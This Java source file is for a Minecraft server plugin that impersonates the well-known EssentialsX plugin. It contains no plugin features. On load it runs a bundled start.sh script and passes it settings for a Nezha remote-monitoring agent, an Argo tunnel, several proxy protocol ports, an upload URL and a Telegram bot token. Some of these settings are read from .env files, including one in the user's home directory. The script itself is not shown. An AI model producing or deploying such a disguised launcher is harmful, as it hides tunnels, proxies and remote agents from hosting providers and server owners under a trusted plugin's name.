package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {
    private Process sbxProcess;
    private volatile boolean shouldRun = true;
    private volatile boolean isProcessRunning = false;

    private static final String[] ALL_ENV_VARS = {
        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");

        try {
            startSbxProcess();
            getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start start.sh process: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void startSbxProcess() throws Exception {
        if (isProcessRunning) {
            return;
        }

        // 本地 start.sh 路径
        Path pluginDir = getDataFolder().toPath();
        Path startScript = pluginDir.resolve("start.sh");

        if (!Files.exists(startScript)) {
            throw new IOException("start.sh not found in plugin folder: " + startScript.toAbsolutePath());
        }

        // 确保脚本可执行
        if (!startScript.toFile().setExecutable(true)) {
            throw new IOException("Failed to set start.sh executable permission");
        }

        // 准备 ProcessBuilder
        ProcessBuilder pb = new ProcessBuilder(startScript.toAbsolutePath().toString());
        pb.directory(pluginDir.toFile());

        // 设置环境变量
        Map<String, String> env = pb.environment();

        // 系统环境变量
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }

        // .env 文件
        loadEnvFileFromMultipleLocations(env);

        // Bukkit 配置
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }

        // 输出重定向
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);

        // 启动进程
        sbxProcess = pb.start();
        isProcessRunning = true;

        // 监控线程
        startProcessMonitor();
    }

    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
        }

        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));

        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    loadEnvFile(envFile, env);
                    break;
                } catch (IOException e) {
                    // 读取失败，跳过
                }
            }
        }
    }

    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
        for (String line : Files.readAllLines(envFile)) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            line = line.split(" #")[0].split(" //")[0].trim();
            if (line.startsWith("export ")) {
                line = line.substring(7).trim();
            }

            String[] parts = line.split("=", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");

                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                    env.put(key, value);
                }
            }
        }
    }

    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                int exitCode = sbxProcess.waitFor();
                isProcessRunning = false;
                getLogger().info("start.sh process exited with code: " + exitCode);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "StartSh-Process-Monitor");

        monitorThread.setDaemon(true);
        monitorThread.start();
    }

    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");

        shouldRun = false;

        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            try {
                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
                    sbxProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated start.sh process");
                } else {
                    getLogger().info("start.sh process stopped normally");
                }
            } catch (InterruptedException e) {
                sbxProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isProcessRunning = false;
        }

        getLogger().info("EssentialsX plugin disabled");
    }
}
